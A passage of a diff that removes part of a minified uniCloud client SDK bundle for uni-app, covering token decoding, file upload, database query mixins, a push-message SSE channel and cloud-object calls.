-            return "%" + ("00" + e.charCodeAt(0).toString(16)).slice(-2);
-          }).join(""))));
-        } catch (n) {
-          throw new Error("\u83B7\u53D6\u5F53\u524D\u7528\u6237\u4FE1\u606F\u51FA\u9519\uFF0C\u8BE6\u7EC6\u9519\u8BEF\u4FE1\u606F\u4E3A\uFF1A" + n.message);
-        }
-        return e.tokenExpired = 1000 * e.exp, delete e.exp, delete e.iat, e;
-      }
-      Hn = "function" != typeof atob ? function (e) {
-        if (e = String(e).replace(/[\t\n\f\r ]+/g, ""), !ur.test(e)) throw new Error("Failed to execute 'atob' on 'Window': The string to be decoded is not correctly encoded.");
-        var t;
-        e += "==".slice(2 - (3 & e.length));
-        for (var n, r, i = "", o = 0; o < e.length;) t = sr.indexOf(e.charAt(o++)) << 18 | sr.indexOf(e.charAt(o++)) << 12 | (n = sr.indexOf(e.charAt(o++))) << 6 | (r = sr.indexOf(e.charAt(o++))), i += 64 === n ? String.fromCharCode(t >> 16 & 255) : 64 === r ? String.fromCharCode(t >> 16 & 255, t >> 8 & 255) : String.fromCharCode(t >> 16 & 255, t >> 8 & 255, 255 & t);
-        return i;
-      } : atob;
-      var lr = S(function (e, t) {
-          Object.defineProperty(t, "__esModule", {
-            value: !0
-          });
-          var n = "chooseAndUploadFile:ok",
-            i = "chooseAndUploadFile:fail";
-          function o(e, t) {
-            return e.tempFiles.forEach(function (e, n) {
-              e.name || (e.name = e.path.substring(e.path.lastIndexOf("/") + 1)), t && (e.fileType = t), e.cloudPath = Date.now() + "_" + n + e.name.substring(e.name.lastIndexOf("."));
-            }), e.tempFilePaths || (e.tempFilePaths = e.tempFiles.map(function (e) {
-              return e.path;
-            })), e;
-          }
-          function a(e, t, r) {
-            var i = r.onChooseFile,
-              o = r.onUploadProgress;
-            return t.then(function (e) {
-              if (i) {
-                var t = i(e);
-                if (void 0 !== t) return Promise.resolve(t).then(function (t) {
-                  return void 0 === t ? e : t;
-                });
-              }
-              return e;
-            }).then(function (t) {
-              return !1 === t ? {
-                errMsg: n,
-                tempFilePaths: [],
-                tempFiles: []
-              } : function (e, t) {
-                var r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 5,
-                  i = arguments.length > 3 ? arguments[3] : void 0;
-                (t = Object.assign({}, t)).errMsg = n;
-                var o = t.tempFiles,
-                  a = o.length,
-                  s = 0;
-                return new Promise(function (n) {
-                  for (; s < r;) u();
-                  function u() {
-                    var r = s++;
-                    if (r >= a) !o.find(function (e) {
-                      return !e.url && !e.errMsg;
-                    }) && n(t);else {
-                      var c = o[r];
-                      e.uploadFile({
-                        provider: c.provider,
-                        filePath: c.path,
-                        cloudPath: c.cloudPath,
-                        fileType: c.fileType,
-                        cloudPathAsRealPath: c.cloudPathAsRealPath,
-                        onUploadProgress: function (e) {
-                          e.index = r, e.tempFile = c, e.tempFilePath = c.path, i && i(e);
-                        }
-                      }).then(function (e) {
-                        c.url = e.fileID, r < a && u();
-                      }).catch(function (e) {
-                        c.errMsg = e.errMsg || e.message, r < a && u();
-                      });
-                    }
-                  }
-                });
-              }(e, t, 5, o);
-            });
-          }
-          t.initChooseAndUploadFile = function (e) {
-            return function () {
-              var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
-                type: "all"
-              };
-              return "image" === t.type ? a(e, function (e) {
-                var t = e.count,
-                  n = e.sizeType,
-                  r = e.sourceType,
-                  a = void 0 === r ? ["album", "camera"] : r,
-                  s = e.extension;
-                return new Promise(function (e, r) {
-                  uni.chooseImage({
-                    count: t,
-                    sizeType: n,
-                    sourceType: a,
-                    extension: s,
-                    success: function (t) {
-                      e(o(t, "image"));
-                    },
-                    fail: function (e) {
-                      r({
-                        errMsg: e.errMsg.replace("chooseImage:fail", i)
-                      });
-                    }
-                  });
-                });
-              }(t), t) : "video" === t.type ? a(e, function (e) {
-                var t = e.camera,
-                  n = e.compressed,
-                  r = e.maxDuration,
-                  a = e.sourceType,
-                  s = void 0 === a ? ["album", "camera"] : a,
-                  u = e.extension;
-                return new Promise(function (e, a) {
-                  uni.chooseVideo({
-                    camera: t,
-                    compressed: n,
-                    maxDuration: r,
-                    sourceType: s,
-                    extension: u,
-                    success: function (t) {
-                      var n = t.tempFilePath,
-                        r = t.duration,
-                        i = t.size,
-                        a = t.height,
-                        s = t.width;
-                      e(o({
-                        errMsg: "chooseVideo:ok",
-                        tempFilePaths: [n],
-                        tempFiles: [{
-                          name: t.tempFile && t.tempFile.name || "",
-                          path: n,
-                          size: i,
-                          type: t.tempFile && t.tempFile.type || "",
-                          width: s,
-                          height: a,
-                          duration: r,
-                          fileType: "video",
-                          cloudPath: ""
-                        }]
-                      }, "video"));
-                    },
-                    fail: function (e) {
-                      a({
-                        errMsg: e.errMsg.replace("chooseVideo:fail", i)
-                      });
-                    }
-                  });
-                });
-              }(t), t) : a(e, function (e) {
-                var t = e.count,
-                  n = e.extension;
-                return new Promise(function (e, a) {
-                  var s = uni.chooseFile;
-                  if ("undefined" != typeof r && "function" == typeof r.chooseMessageFile && (s = r.chooseMessageFile), "function" != typeof s) return a({
-                    errMsg: i + " \u8BF7\u6307\u5B9A type \u7C7B\u578B\uFF0C\u8BE5\u5E73\u53F0\u4EC5\u652F\u6301\u9009\u62E9 image \u6216 video\u3002"
-                  });
-                  s({
-                    type: "all",
-                    count: t,
-                    extension: n,
-                    success: function (t) {
-                      e(o(t));
-                    },
-                    fail: function (e) {
-                      a({
-                        errMsg: e.errMsg.replace("chooseFile:fail", i)
-                      });
-                    }
-                  });
-                });
-              }(t), t);
-            };
-          };
-        }),
-        fr = function (e) {
-          return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e;
-        }(lr),
-        dr = {
-          auto: "auto",
-          onready: "onready",
-          manual: "manual"
-        };
-      function hr(e) {
-        return {
-          props: {
-            localdata: {
-              type: Array,
-              default: function () {
-                return [];
-              }
-            },
-            options: {
-              type: [Object, Array],
-              default: function () {
-                return {};
-              }
-            },
-            spaceInfo: {
-              type: Object,
-              default: function () {
-                return {};
-              }
-            },
-            collection: {
-              type: [String, Array],
-              default: ""
-            },
-            action: {
-              type: String,
-              default: ""
-            },
-            field: {
-              type: String,
-              default: ""
-            },
-            orderby: {
-              type: String,
-              default: ""
-            },
-            where: {
-              type: [String, Object],
-              default: ""
-            },
-            pageData: {
-              type: String,
-              default: "add"
-            },
-            pageCurrent: {
-              type: Number,
-              default: 1
-            },
-            pageSize: {
-              type: Number,
-              default: 20
-            },
-            getcount: {
-              type: [Boolean, String],
-              default: !1
-            },
-            gettree: {
-              type: [Boolean, String],
-              default: !1
-            },
-            gettreepath: {
-              type: [Boolean, String],
-              default: !1
-            },
-            startwith: {
-              type: String,
-              default: ""
-            },
-            limitlevel: {
-              type: Number,
-              default: 10
-            },
-            groupby: {
-              type: String,
-              default: ""
-            },
-            groupField: {
-              type: String,
-              default: ""
-            },
-            distinct: {
-              type: [Boolean, String],
-              default: !1
-            },
-            foreignKey: {
-              type: String,
-              default: ""
-            },
-            loadtime: {
-              type: String,
-              default: "auto"
-            },
-            manual: {
-              type: Boolean,
-              default: !1
-            }
-          },
-          data: function () {
-            return {
-              mixinDatacomLoading: !1,
-              mixinDatacomHasMore: !1,
-              mixinDatacomResData: [],
-              mixinDatacomErrorMessage: "",
-              mixinDatacomPage: {},
-              mixinDatacomError: null
-            };
-          },
-          created: function () {
-            var e = this;
-            this.mixinDatacomPage = {
-              current: this.pageCurrent,
-              size: this.pageSize,
-              count: 0
-            }, this.$watch(function () {
-              var t = [];
-              return ["pageCurrent", "pageSize", "localdata", "collection", "action", "field", "orderby", "where", "getont", "getcount", "gettree", "groupby", "groupField", "distinct"].forEach(function (n) {
-                t.push(e[n]);
-              }), t;
-            }, function (t, n) {
-              if (e.loadtime !== dr.manual) {
-                for (var r = !1, i = [], o = 2; o < t.length; o++) t[o] !== n[o] && (i.push(t[o]), r = !0);
-                t[0] !== n[0] && (e.mixinDatacomPage.current = e.pageCurrent), e.mixinDatacomPage.size = e.pageSize, e.onMixinDatacomPropsChange(r, i);
-              }
-            });
-          },
-          methods: {
-            onMixinDatacomPropsChange: function (e, t) {},
-            mixinDatacomEasyGet: function () {
-              var e = this,
-                t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                n = t.getone,
-                r = void 0 !== n && n,
-                i = t.success,
-                o = t.fail;
-              this.mixinDatacomLoading || (this.mixinDatacomLoading = !0, this.mixinDatacomErrorMessage = "", this.mixinDatacomError = null, this.mixinDatacomGet().then(function (t) {
-                e.mixinDatacomLoading = !1;
-                var n = t.result,
-                  o = n.data,
-                  a = n.count;
-                e.getcount && (e.mixinDatacomPage.count = a), e.mixinDatacomHasMore = o.length < e.pageSize;
-                var s = r ? o.length ? o[0] : void 0 : o;
-                e.mixinDatacomResData = s, i && i(s);
-              }).catch(function (t) {
-                e.mixinDatacomLoading = !1, e.mixinDatacomErrorMessage = t, e.mixinDatacomError = t, o && o(t);
-              }));
-            },
-            mixinDatacomGet: function () {
-              var t,
-                n,
-                r = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
-              r = r || {}, n = "undefined" != typeof __uniX && __uniX ? e.databaseForJQL(this.spaceInfo) : e.database(this.spaceInfo);
-              var i = r.action || this.action;
-              i && (n = n.action(i));
-              var o = r.collection || this.collection;
-              n = Array.isArray(o) ? (t = n).collection.apply(t, (0, c.default)(o)) : n.collection(o);
-              var a = r.where || this.where;
-              a && Object.keys(a).length && (n = n.where(a));
-              var s = r.field || this.field;
-              s && (n = n.field(s));
-              var u = r.foreignKey || this.foreignKey;
-              u && (n = n.foreignKey(u));
-              var l = r.groupby || this.groupby;
-              l && (n = n.groupBy(l));
-              var f = r.groupField || this.groupField;
-              f && (n = n.groupField(f)), !0 === (void 0 !== r.distinct ? r.distinct : this.distinct) && (n = n.distinct());
-              var d = r.orderby || this.orderby;
-              d && (n = n.orderBy(d));
-              var h = void 0 !== r.pageCurrent ? r.pageCurrent : this.mixinDatacomPage.current,
-                p = void 0 !== r.pageSize ? r.pageSize : this.mixinDatacomPage.size,
-                g = void 0 !== r.getcount ? r.getcount : this.getcount,
-                v = void 0 !== r.gettree ? r.gettree : this.gettree,
-                m = void 0 !== r.gettreepath ? r.gettreepath : this.gettreepath,
-                _ = {
-                  getCount: g
-                },
-                y = {
-                  limitLevel: void 0 !== r.limitlevel ? r.limitlevel : this.limitlevel,
-                  startWith: void 0 !== r.startwith ? r.startwith : this.startwith
-                };
-              return v && (_.getTree = y), m && (_.getTreePath = y), n = n.skip(p * (h - 1)).limit(p).get(_), n;
-            }
-          }
-        };
-      }
-      function pr(e) {
-        return K(ln.replace("{spaceId}", e.config.spaceId));
-      }
-      function gr() {
-        return vr.apply(this, arguments);
-      }
-      function vr() {
-        return vr = (0, l.default)(o.default.mark(function e() {
-          var t,
-            n,
-            r,
-            i,
-            a,
-            s,
-            u,
-            c = arguments;
-          return o.default.wrap(function (e) {
-            while (1) switch (e.prev = e.next) {
-              case 0:
-                if (t = c.length > 0 && void 0 !== c[0] ? c[0] : {}, n = t.openid, r = t.callLoginByWeixin, i = void 0 !== r && r, a = pr(this), "mp-weixin" === J) {
-                  e.next = 4;
-                  break;
-                }
-                throw new Error("[SecureNetwork] API `initSecureNetworkByWeixin` is not supported on platform `".concat(J, "`"));
-              case 4:
-                if (!n || !i) {
-                  e.next = 6;
-                  break;
-                }
-                throw new Error("[SecureNetwork] openid and callLoginByWeixin cannot be passed at the same time");
-              case 6:
-                if (!n) {
-                  e.next = 8;
-                  break;
-                }
-                return e.abrupt("return", (a.mpWeixinOpenid = n, {}));
-              case 8:
-                return e.next = 10, new Promise(function (e, t) {
-                  uni.login({
-                    success: function (t) {
-                      e(t.code);
-                    },
-                    fail: function (e) {
-                      t(new Error(e.errMsg));
-                    }
-                  });
-                });
-              case 10:
-                return s = e.sent, u = this.importObject("uni-id-co", {
-                  customUI: !0
-                }), e.next = 14, u.secureNetworkHandshakeByWeixin({
-                  code: s,
-                  callLoginByWeixin: i
-                });
-              case 14:
-                return a.mpWeixinCode = s, e.abrupt("return", {
-                  code: s
-                });
-              case 16:
-              case "end":
-                return e.stop();
-            }
-          }, e, this);
-        })), vr.apply(this, arguments);
-      }
-      function mr(e) {
-        return _r.apply(this, arguments);
-      }
-      function _r() {
-        return _r = (0, l.default)(o.default.mark(function e(t) {
-          var n;
-          return o.default.wrap(function (e) {
-            while (1) switch (e.prev = e.next) {
-              case 0:
-                return n = pr(this), e.abrupt("return", (n.initPromise || (n.initPromise = gr.call(this, t).then(function (e) {
-                  return e;
-                }).catch(function (e) {
-                  throw delete n.initPromise, e;
-                })), n.initPromise));
-              case 2:
-              case "end":
-                return e.stop();
-            }
-          }, e, this);
-        })), _r.apply(this, arguments);
-      }
-      function yr(e) {
-        !function (e) {
-          xe = e;
-        }(e);
-      }
-      function wr(e) {
-        var t = "mp-weixin" === J && r.canIUse("getAppBaseInfo"),
-          n = {
-            getAppBaseInfo: t ? uni.getAppBaseInfo : uni.getSystemInfo,
-            getPushClientId: uni.getPushClientId
-          };
-        return function (r) {
-          return new Promise(function (i, o) {
-            t && "getAppBaseInfo" === e ? i(n[e]()) : n[e](x(x({}, r), {}, {
-              success: function (e) {
-                i(e);
-              },
-              fail: function (e) {
-                o(e);
-              }
-            }));
-          });
-        };
-      }
-      var br = function (e) {
-        (0, d.default)(n, e);
-        var t = k(n);
-        function n() {
-          var e;
-          return (0, v.default)(this, n), e = t.call(this), e._uniPushMessageCallback = e._receivePushMessage.bind((0, a.default)(e)), e._currentMessageId = -1, e._payloadQueue = [], e;
-        }
-        return (0, m.default)(n, [{
-          key: "init",
-          value: function () {
-            var e = this;
-            return Promise.all([wr("getAppBaseInfo")(), wr("getPushClientId")()]).then(function () {
-              var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [],
-                n = (0, s.default)(t, 2),
-                r = n[0];
-              r = void 0 === r ? {} : r;
-              var i = r.appId,
-                o = n[1];
-              o = void 0 === o ? {} : o;
-              var a = o.cid;
-              if (!i) throw new Error("Invalid appId, please check the manifest.json file");
-              if (!a) throw new Error("Invalid push client id");
-              e._appId = i, e._pushClientId = a, e._seqId = Date.now() + "-" + Math.floor(900000 * Math.random() + 100000), e.emit("open"), e._initMessageListener();
-            }, function (t) {
-              throw e.emit("error", t), e.close(), t;
-            });
-          }
-        }, {
-          key: "open",
-          value: function () {
-            var e = (0, l.default)(o.default.mark(function e() {
-              return o.default.wrap(function (e) {
-                while (1) switch (e.prev = e.next) {
-                  case 0:
-                    return e.abrupt("return", this.init());
-                  case 1:
-                  case "end":
-                    return e.stop();
-                }
-              }, e, this);
-            }));
-            return function () {
-              return e.apply(this, arguments);
-            };
-          }()
-        }, {
-          key: "_isUniCloudSSE",
-          value: function (e) {
-            if ("receive" !== e.type) return !1;
-            var t = e && e.data && e.data.payload;
-            return !(!t || "UNI_CLOUD_SSE" !== t.channel || t.seqId !== this._seqId);
-          }
-        }, {
-          key: "_receivePushMessage",
-          value: function (e) {
-            if (this._isUniCloudSSE(e)) {
-              var t = e && e.data && e.data.payload,
-                n = t.action,
-                r = t.messageId,
-                i = t.message;
-              this._payloadQueue.push({
-                action: n,
-                messageId: r,
-                message: i
-              }), this._consumMessage();
-            }
-          }
-        }, {
-          key: "_consumMessage",
-          value: function () {
-            for (var e = this;;) {
-              var t = this._payloadQueue.find(function (t) {
-                return t.messageId === e._currentMessageId + 1;
-              });
-              if (!t) break;
-              this._currentMessageId++, this._parseMessagePayload(t);
-            }
-          }
-        }, {
-          key: "_parseMessagePayload",
-          value: function (e) {
-            var t = e.action,
-              n = e.messageId,
-              r = e.message;
-            "end" === t ? this._end({
-              messageId: n,
-              message: r
-            }) : "message" === t && this._appendMessage({
-              messageId: n,
-              message: r
-            });
-          }
-        }, {
-          key: "_appendMessage",
-          value: function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              t = (e.messageId, e.message);
-            this.emit("message", t);
-          }
-        }, {
-          key: "_end",
-          value: function () {
-            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-              t = (e.messageId, e.message);
-            this.emit("end", t), this.close();
-          }
-        }, {
-          key: "_initMessageListener",
-          value: function () {
-            uni.onPushMessage(this._uniPushMessageCallback);
-          }
-        }, {
-          key: "_destroy",
-          value: function () {
-            uni.offPushMessage(this._uniPushMessageCallback);
-          }
-        }, {
-          key: "toJSON",
-          value: function () {
-            return {
-              appId: this._appId,
-              pushClientId: this._pushClientId,
-              seqId: this._seqId
-            };
-          }
-        }, {
-          key: "close",
-          value: function () {
-            this._destroy(), this.emit("close");
-          }
-        }]), n;
-      }(z);
-      var xr = {
-          tcb: $t,
-          tencent: $t,
-          aliyun: Pe,
-          private: Yt,
-          dcloud: Yt,
-          alipay: tn
-        },
-        kr = new (function () {
-          function e() {
-            (0, v.default)(this, e);
-          }
-          return (0, m.default)(e, [{
-            key: "init",
-            value: function (e) {
-              var t = {},
-                n = xr[e.provider];
-              if (!n) throw new Error("\u672A\u63D0\u4F9B\u6B63\u786E\u7684provider\u53C2\u6570");
-              return t = n.init(e), function (e) {
-                e._initPromiseHub || (e._initPromiseHub = new q({
-                  createPromise: function () {
-                    var t = Promise.resolve();
-                    t = new Promise(function (e) {
-                      setTimeout(function () {
-                        e();
-                      }, 1);
-                    });
-                    var n = e.auth();
-                    return t.then(function () {
-                      return n.getLoginState();
-                    }).then(function (e) {
-                      return e ? Promise.resolve() : n.signInAnonymously();
-                    });
-                  }
-                }));
-              }(t), yn(t), function (e) {
-                var t = e.uploadFile;
-                e.uploadFile = function (e) {
-                  return t.call(this, e);
-                };
-              }(t), function (e) {
-                e.database = function (t) {
-                  if (t && Object.keys(t).length > 0) return e.init(t).database();
-                  if (this._database) return this._database;
-                  var n = En(Ln, {
-                    uniClient: e
-                  });
-                  return this._database = n, n;
-                }, e.databaseForJQL = function (t) {
-                  if (t && Object.keys(t).length > 0) return e.init(t).databaseForJQL();
-                  if (this._databaseForJQL) return this._databaseForJQL;
-                  var n = En(Ln, {
-                    uniClient: e,
-                    isJQL: !0
-                  });
-                  return this._databaseForJQL = n, n;
-                };
-              }(t), function (e) {
-                e.getCurrentUserInfo = cr, e.chooseAndUploadFile = fr.initChooseAndUploadFile(e), Object.assign(e, {
-                  get mixinDatacom() {
-                    return hr(e);
-                  }
-                }), e.SSEChannel = br, e.initSecureNetworkByWeixin = function (e) {
-                  return function () {
-                    var t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                      n = t.openid,
-                      r = t.callLoginByWeixin,
-                      i = void 0 !== r && r;
-                    return mr.call(e, {
-                      openid: n,
-                      callLoginByWeixin: i
-                    });
-                  };
-                }(e), e.setCustomClientInfo = yr, e.importObject = function (e) {
-                  return function (t) {
-                    var n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-                    n = function (e) {
-                      var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
-                      return e.customUI = t.customUI || e.customUI, e.parseSystemError = t.parseSystemError || e.parseSystemError, Object.assign(e.loadingOptions, t.loadingOptions), Object.assign(e.errorOptions, t.errorOptions), "object" == (0, u.default)(t.secretMethods) && (e.secretMethods = t.secretMethods), e;
-                    }({
-                      customUI: !1,
-                      loadingOptions: {
-                        title: "\u52A0\u8F7D\u4E2D...",
-                        mask: !0
-                      },
-                      errorOptions: {
-                        type: "modal",
-                        retry: !1
-                      }
-                    }, n);
-                    var r = n,
-                      i = r.customUI,
-                      a = r.loadingOptions,
-                      s = r.errorOptions,
-                      c = r.parseSystemError,
-                      f = !i;
-                    return new Proxy({}, {
-                      get: function (r, i) {
-                        switch (i) {
-                          case "toString":
-                            return "[object UniCloudObject]";
-                          case "toJSON":
-                            return {};
-                        }
-                        return function () {
-                          var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                            t = e.fn,
-                            n = e.interceptorName,
-                            r = e.getCallbackArgs;
-                          return (0, l.default)(o.default.mark(function e() {
-                            var i,
-                              a,
-                              s,
-                              u,
-                              c,
-                              l,
-                              f = arguments;
-                            return o.default.wrap(function (e) {
-                              while (1) switch (e.prev = e.next) {
-                                case 0:
-                                  for (i = f.length, a = new Array(i), s = 0; s < i; s++) a[s] = f[s];
-                                  return u = r ? r({
-                                    params: a
-                                  }) : {}, e.prev = 2, e.next = 5, te(ne(n, "invoke"), x({}, u));
-                                case 5:
-                                  return e.next = 7, t.apply(void 0, a);
-                                case 7:
-                                  return c = e.sent, e.next = 10, te(ne(n, "success"), x(x({}, u), {}, {
-                                    result: c
-                                  }));
-                                case 10:
-                                  return e.abrupt("return", c);
-                                case 13:
-                                  return e.prev = 13, e.t0 = e["catch"](2), l = e.t0, e.next = 18, te(ne(n, "fail"), x(x({}, u), {}, {
-                                    error: l
-                                  }));
-                                case 18:
-                                  throw l;
-                                case 19:
-                                  return e.prev = 19, e.next = 22, te(ne(n, "complete"), x(x({}, u), {}, l ? {
-                                    error: l
-                                  } : {
-                                    result: c
-                                  }));
-                                case 22:
-                                  return e.finish(19);
-                                case 23:
-                                case "end":
-                                  return e.stop();
-                              }
-                            }, e, null, [[2, 13, 19, 23]]);
-                          }));
-                        }({
-                          fn: function () {
-                            var r = (0, l.default)(o.default.mark(function r() {
-                              var h,
-                                p,
-                                g,
-                                v,
-                                m,
-                                _,
-                                y,
-                                w,
-                                b,
-                                k,
-                                S,
-                                O,
-                                T,
-                                P,
-                                A,
-                                I = arguments;
-                              return o.default.wrap(function (r) {
-                                while (1) switch (r.prev = r.next) {
-                                  case 0:
-                                    for (f && uni.showLoading({
-                                      title: a.title,
-                                      mask: a.mask
-                                    }), p = I.length, g = new Array(p), v = 0; v < p; v++) g[v] = I[v];
-                                    return m = {
-                                      name: t,
-                                      type: L.OBJECT,
-                                      data: {
-                                        method: i,
-                                        params: g
-                                      }
-                                    }, "object" == (0, u.default)(n.secretMethods) && function (e, t) {
-                                      var n = t.data.method,
-                                        r = e.secretMethods || {},
-                                        i = r[n] || r["*"];
-                                      i && (t.secretType = i);
-                                    }(n, m), _ = !1, r.prev = 5, r.next = 8, e.callFunction(m);
-                                  case 8:
-                                    h = r.sent, r.next = 14;
-                                    break;
-                                  case 11:
-                                    r.prev = 11, r.t0 = r["catch"](5), _ = !0, h = {
-                                      result: new ge(r.t0)
-                                    };
-                                  case 14:
-                                    if (y = h.result || {}, w = y.errSubject, b = y.errCode, k = y.errMsg, S = y.newToken, f && uni.hideLoading(), S && S.token && S.tokenExpired && (we(S), le(oe.REFRESH_TOKEN, x({}, S))), !b) {
-                                      r.next = 39;
-                                      break;
-                                    }
-                                    if (O = k, !_ || !c) {
-                                      r.next = 24;
-                                      break;
-                                    }
-                                    return r.next = 20, c({
-                                      objectName: t,
-                                      methodName: i,
-                                      params: g,
-                                      errSubject: w,
-                                      errCode: b,
-                                      errMsg: k
-                                    });
-                                  case 20:
-                                    if (r.t1 = r.sent.errMsg, r.t1) {
-                                      r.next = 23;
-                                      break;
-                                    }
-                                    r.t1 = k;
-                                  case 23:
-                                    O = r.t1;
-                                  case 24:
-                                    if (!f) {
-                                      r.next = 37;
-                                      break;
-                                    }
-                                    if ("toast" !== s.type) {
-                                      r.next = 29;
-                                      break;
-                                    }
-                                    uni.showToast({
-                                      title: O,
-                                      icon: "none"
-                                    }), r.next = 37;
-                                    break;
-                                  case 29:
-                                    if ("modal" === s.type) {
-                                      r.next = 31;
-                                      break;
-                                    }
-                                    throw new Error("Invalid errorOptions.type: ".concat(s.type));
-                                  case 31:
-                                    return r.next = 33, (0, l.default)(o.default.mark(function e() {
-                                      var t,
-                                        n,
-                                        r,
-                                        i,
-                                        a,
-                                        s,
-                                        u = arguments;
-                                      return o.default.wrap(function (e) {
-                                        while (1) switch (e.prev = e.next) {
-                                          case 0:
-                                            return t = u.length > 0 && void 0 !== u[0] ? u[0] : {}, n = t.title, r = t.content, i = t.showCancel, a = t.cancelText, s = t.confirmText, e.abrupt("return", new Promise(function (e, t) {
-                                              uni.showModal({
-                                                title: n,
-                                                content: r,
-                                                showCancel: i,
-                                                cancelText: a,
-                                                confirmText: s,
-                                                success: function (t) {
-                                                  e(t);
-                                                },
-                                                fail: function () {
-                                                  e({
-                                                    confirm: !1,
-                                                    cancel: !0
-                                                  });
-                                                }
-                                              });
-                                            }));
-                                          case 2:
-                                          case "end":
-                                            return e.stop();
-                                        }
-                                      }, e);
-                                    }))({
-                                      title: "\u63D0\u793A",
-                                      content: O,
-                                      showCancel: s.retry,
-                                      cancelText: "\u53D6\u6D88",
-                                      confirmText: s.retry ? "\u91CD\u8BD5" : "\u786E\u5B9A"
-                                    });
-                                  case 33:
-                                    if (T = r.sent, P = T.confirm, !s.retry || !P) {
-                                      r.next = 37;
-                                      break;
-                                    }
-                                    return r.abrupt("return", d.apply(void 0, g));
-                                  case 37:
-                                    throw A = new ge({
-                                      subject: w,
-                                      code: b,
-                                      message: k,
-                                      requestId: h.requestId
-                                    }), A.detail = h.result, le(oe.RESPONSE, {
-                                      type: ae.CLOUD_OBJECT,
-                                      content: A
-                                    }), A;
-                                  case 39:
-                                    return r.abrupt("return", (le(oe.RESPONSE, {
-                                      type: ae.CLOUD_OBJECT,
-                                      content: h.result
-                                    }), h.result));
-                                  case 40:
-                                  case "end":
-                                    return r.stop();
-                                }
-                              }, r, null, [[5, 11]]);
-                            }));
-                            function d() {
-                              return r.apply(this, arguments);
-                            }
-                            return d;
-                          }(),
-                          interceptorName: "callObject",
-                          getCallbackArgs: function () {
-                            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
-                              n = e.params;
-                            return {
-                              objectName: t,
-                              methodName: i,
-                              params: n
-                            };
-                          }
-                        });
-                      }
-                    });
-                  };
-                }(e);
-              }(t), ["callFunction", "uploadFile", "deleteFile", "getTempFileURL", "downloadFile", "chooseAndUploadFile"].forEach(function (e) {
-                if (t[e]) {
-                  var n = t[e];
-                  t[e] = function () {
-                    return n.apply(t, Array.from(arguments));
-                  }, t[e] = function (e, t) {
-                    return function (n) {
-                      var r = this,
-                        i = !1;
-                      if ("callFunction" === t) {
-                        var o = n && n.type || L.DEFAULT;
-                        i = o !== L.DEFAULT;
-                      }
-                      var a = "callFunction" === t && !i,
-                        s = this._initPromiseHub.exec();
-                      n = n || {};
-                      var u = pe(n),
-                        c = u.success,
-                        l = u.fail,
-                        f = u.complete,
-                        d = s.then(function () {
-                          return i ? Promise.resolve() : te(ne(t, "invoke"), n);
-                        }).then(function () {
-                          return e.call(r, n);
-                        }).then(function (e) {
-                          return i ? Promise.resolve(e) : te(ne(t, "success"), e).then(function () {
-                            return te(ne(t, "complete"), e);
-                          }).then(function () {
-                            return a && le(oe.RESPONSE, {
-                              type: ae.CLOUD_FUNCTION,
-                              content: e
-                            }), Promise.resolve(e);
-                          });
-                        }, function (e) {
-                          return i ? Promise.reject(e) : te(ne(t, "fail"), e).then(function () {
-                            return te(ne(t, "complete"), e);
-                          }).then(function () {
-                            return le(oe.RESPONSE, {
-                              type: ae.CLOUD_FUNCTION,
-                              content: e
-                            }), Promise.reject(e);
-                          });
-                        });
-                      if (!(c || l || f)) return d;
-                      d.then(function (e) {
-                        c && c(e), f && f(e), a && le(oe.RESPONSE, {
-                          type: ae.CLOUD_FUNCTION,
-                          content: e
-                        });
-                      }, function (e) {
-                        l && l(e), f && f(e), a && le(oe.RESPONSE, {
-                          type: ae.CLOUD_FUNCTION,
-                          content: e
-                        });
-                      });
-                    };
-                  }(t[e], e).bind(t);
-                }
-              }), t.init = this.init, t;
-            }
-          }]), e;
-        }())();
-      t.uniCloud = kr, function () {
-        var e = V,
-          n = {};
-        if (e && 1 === e.length) n = e[0], t.uniCloud = kr = kr.init(n), kr._isDefault = !0;else {
-          var r,
-            i = ["database", "getCurrentUserInfo", "importObject"];
-          r = e && e.length > 0 ? "\u5E94\u7528\u6709\u591A\u4E2A\u670D\u52A1\u7A7A\u95F4\uFF0C\u8BF7\u901A\u8FC7uniCloud.init\u65B9\u6CD5\u6307\u5B9A\u8981\u4F7F\u7528\u7684\u670D\u52A1\u7A7A\u95F4" : "\u5E94\u7528\u672A\u5173\u8054\u670D\u52A1\u7A7A\u95F4\uFF0C\u8BF7\u5728uniCloud\u76EE\u5F55\u53F3\u952E\u5173\u8054\u670D\u52A1\u7A7A\u95F4", [].concat(["auth", "callFunction", "uploadFile", "deleteFile", "getTempFileURL", "downloadFile"], i).forEach(function (e) {
-            kr[e] = function () {
-              if (console.error(r), -1 === i.indexOf(e)) return Promise.reject(new ge({
-                code: "SYS_ERR",
-                message: r
-              }));
-              console.error(r);
-            };
-          });
-        }
-        if (Object.assign(kr, {
-          get mixinDatacom() {
-            return hr(kr);
-          }
-        }), ar(kr), kr.addInterceptor = X, kr.removeInterceptor = ee, kr.interceptObject = re, "app" === J && (uni.__uniCloud = kr), "app" === J || "web" === J) {
-          var o = function () {
-            return Z || (Z = function () {
-              if ("undefined" != typeof globalThis) return globalThis;
-              if ("undefined" != typeof self) return self;
-              if ("undefined" != typeof window) return window;
-              function e() {
-                return this;
-              }
-              return void 0 !== e() ? e() : new Function("return this")();
-            }(), Z);
-          }();
-          o.uniCloud = kr, o.UniCloudError = ge;
-        }
-      }();
-      var Sr = kr;
-      t.default = Sr;
-    }).call(this, n("0ee4"), n("ed83")["default"]);
-  },
-  "8c35": function (module, exports, __webpack_require__) {
-    "use strict";
-
-    (function (__f__) {
-      var _interopRequireDefault = __webpack_require__("47a9");
-      Object.defineProperty(exports, "__esModule", {
-        value: !0
-      }), exports.default = void 0;
-      var _defineProperty2 = _interopRequireDefault(__webpack_require__("7ca3")),
-        _xl = __webpack_require__("7c82"),
